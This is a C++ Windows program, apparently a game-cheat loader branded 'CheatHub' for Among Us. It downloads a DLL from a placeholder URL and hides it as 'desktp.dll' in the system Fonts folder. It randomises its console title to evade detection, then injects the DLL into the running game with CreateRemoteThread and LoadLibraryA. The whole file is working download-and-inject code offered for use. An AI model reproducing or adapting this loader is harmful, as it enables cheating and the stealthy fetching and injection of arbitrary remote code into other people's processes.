#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include<string>
#include <random>
#pragma comment(lib, "urlmon.lib")

using namespace std;

DWORD GetProcId(const char* procName)
{

    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


std::string random_string(const int len) {
    const std::string alpha_numeric("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890");

    std::default_random_engine generator{ std::random_device{}() };
    const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 };

    std::string str(len, 0);
    for (auto& it : str) {
        it = alpha_numeric[distribution(generator)];
    }

    return str;
}



int main()
{

    SetConsoleTitle(random_string(100).c_str());

    std::cout << "CheatHub AmongUs";
    
    
    string dwnld_URL = "your dll link";
    string savepath = "C:\\Windows\\Fonts\\desktp.dll";// your dll save patch and name
    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);

        
    

    const char* dllPath = "C:\\Windows\\Fonts\\desktp.dll";//
    const char* procName = "Among Us.exe";
    DWORD procId = 0;


    while (!procId)
    {
        procId = GetProcId(procName);
        Sleep(200);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

        if (hThread)
        {
            CloseHandle(hThread);
        }
    }
    else
    {
     
        cout << "PLease Open Among Us";
        //serbest
    }

    if (hProc)
    {
        CloseHandle(hProc);
    }
    
}
